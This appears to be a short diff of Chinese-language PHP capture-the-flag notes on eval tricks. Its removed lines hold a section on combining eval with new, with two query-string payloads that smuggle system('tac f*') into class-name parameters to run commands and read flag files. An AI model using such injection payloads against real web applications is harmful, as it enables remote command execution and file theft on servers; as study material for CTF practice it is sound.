@@ -81,16 +81,7 @@ echo eval(echo 1);
 echo eval("echo 1;");
 ?>
 ```
-^
-**eval和new**
-```
-eval("echo new $v1($v2());");
 
-让new后面有个正常的类不报错，后操作。
-payload:
-v1=Exception();system('tac f*');//&v2=a
-v1=ReflectionClass&v2=system('tac f*')
-```
 
 ^
 ^
